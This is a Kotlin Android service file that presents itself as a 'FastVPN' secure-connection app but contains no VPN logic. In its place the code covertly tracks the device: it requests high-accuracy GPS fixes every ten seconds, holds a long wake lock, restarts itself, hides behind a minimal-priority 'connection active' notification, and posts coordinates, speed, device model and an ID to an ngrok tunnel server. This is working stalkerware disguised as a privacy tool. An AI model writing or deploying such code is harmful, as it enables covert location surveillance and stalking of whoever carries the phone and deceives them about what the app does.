package com.secure.netcore

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class LocationService : Service() {

    private lateinit var fused: FusedLocationProviderClient
    private val http = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()
    private val buffer = ArrayList<Location>()
    private var thread: HandlerThread? = null
    private var handler: Handler? = null

    private val wakeLock: PowerManager.WakeLock by lazy {
        (getSystemService(POWER_SERVICE) as PowerManager)
            .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "fastvpn:conn")
    }

    companion object {
        const val CHANNEL_ID = "vpn_conn"
        const val NOTIFICATION_ID = 42
        const val ACTION_STOP = "com.secure.netcore.STOP"

        const val SERVER_URL = "https://punctured-detail-expansive.ngrok-free.dev"

        const val UPDATE_MS = 10_000L   // геолокация каждые 10 секунд
        const val BATCH_MS = 10_000L    // отправка каждые 10 секунд
        const val MAX_ACCURACY_M = 25f  // потолок точности
    }

    private fun deviceId(): String {
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
        var id = prefs.getString("device_id", null)
        if (id == null) {
            id = "phone-" + (1000..9999).random()
            prefs.edit().putString("device_id", id).apply()
        }
        return id
    }

    private fun deviceModel(): String = "${Build.MANUFACTURER} ${Build.MODEL}"

    private val locationCallback = object : LocationCallback() {
        override fun onLocationResult(result: LocationResult) {
            synchronized(buffer) { buffer.addAll(result.locations) }
        }
    }

    override fun onCreate() {
        super.onCreate()
        fused = LocationServices.getFusedLocationProviderClient(this)
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        startForegroundWithType()
        wakeLock.acquire(10 * 60 * 60 * 1000L)
        startLocationUpdates()
        startBatching()
        return START_STICKY
    }

    private fun startForegroundWithType() {
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("FastVPN")
            .setContentText("Защищённое соединение активно")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(NOTIFICATION_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    @SuppressLint("MissingPermission")
    private fun startLocationUpdates() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) return
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, UPDATE_MS)
            .setMinUpdateIntervalMillis(1000L)
            .setMinUpdateDistanceMeters(0f)
            .setWaitForAccurateLocation(true)
            .build()
        fused.requestLocationUpdates(request, locationCallback, Looper.getMainLooper())
    }

    private fun startBatching() {
        thread = HandlerThread("vpn-io").also { it.start() }
        handler = Handler(thread!!.looper)
        handler?.post(object : Runnable {
            override fun run() {
                flush()
                handler?.postDelayed(this, BATCH_MS)
            }
        })
    }

    private fun flush() {
        val batch: List<Location>
        synchronized(buffer) {
            if (buffer.isEmpty()) return
            batch = ArrayList(buffer)
            buffer.clear()
        }
        // цель 10 м, потолок 25 м, хуже — только если других нет
        val p10 = batch.filter { it.hasAccuracy() && it.accuracy <= 10f }
        val pool = when {
            p10.isNotEmpty() -> p10
            else -> {
                val p25 = batch.filter { it.hasAccuracy() && it.accuracy <= MAX_ACCURACY_M }
                if (p25.isNotEmpty()) p25 else batch
            }
        }
        val best = pool.minByOrNull { if (it.hasAccuracy()) it.accuracy else 9999f } ?: return

        val arr = JSONArray()
        arr.put(JSONObject()
            .put("device_id", deviceId())
            .put("device_model", deviceModel())
            .put("lat", best.latitude)
            .put("lon", best.longitude)
            .put("accuracy", best.accuracy.toDouble())
            .put("speed", (best.speed * 3.6)))
        val body = arr.toString().toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url("$SERVER_URL/points")
            .addHeader("Content-Type", "application/json")
            .post(body)
            .build()
        http.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                synchronized(buffer) { buffer.addAll(0, batch) }
            }
            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }

    private fun stopTracking() {
        fused.removeLocationUpdates(locationCallback)
        handler?.removeCallbacksAndMessages(null)
        thread?.quitSafely()
        if (wakeLock.isHeld) wakeLock.release()
    }

    override fun onDestroy() {
        stopTracking()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(CHANNEL_ID, "VPN", NotificationManager.IMPORTANCE_MIN)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }
}
